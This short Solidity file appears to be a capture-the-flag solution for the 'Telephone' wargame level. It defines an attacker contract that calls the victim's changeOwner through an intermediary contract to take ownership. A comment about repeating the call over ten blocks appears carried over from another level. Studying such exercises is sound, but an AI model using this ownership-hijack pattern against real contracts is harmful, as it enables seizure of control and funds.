// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITelephone {

  function changeOwner(address _owner) external;
}


contract AttackerTelephone{

    ITelephone victim;

    constructor(address _victim) {
        victim = ITelephone(_victim);
    }

    function attack(address _futureOwner) public {
        //Needs to be triggered 10 times in 10 different blocks
        victim.changeOwner(_futureOwner);
    }
}